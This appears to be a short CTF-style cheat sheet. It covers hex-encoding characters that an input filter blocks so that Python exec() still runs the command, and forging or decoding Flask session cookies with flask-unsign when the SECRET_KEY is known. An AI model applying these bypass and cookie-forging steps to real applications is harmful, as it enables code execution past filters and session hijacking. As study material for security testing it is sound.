# Characters not allowed
Python commands can be run in hex form:
```python
string = 'command to be executed'
chars_not_allowed = '[]{}.1'
encoded = ['\\x' + x.encode('hex') for x in chars_not_allowed]
for i in range(len(encoded)):
    string = string.replace(chars_not_allowed[i], encoded[i])
exec(string)
```
Note: The transitions back only happen when the hex is in a string! You might want to escape `'` and `"` in the string!

Note: Try adding more `\\`'s if it doesn't work (`\\`, `\\\\`, `\\\\\\\\`)

# Flask
## Crafting sessions tokens
When the SECRET_KEY is given, these tokens can be maliciously crafted.

The tool [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) provides us many useful functions.

Crafting: `flask-unsign --legacy --sign --cookie '{"key":val}' --secret 'SECRET_KEY'`

They can also be decoded: `flask-unsign --decode --cookie 'cookie_val'`
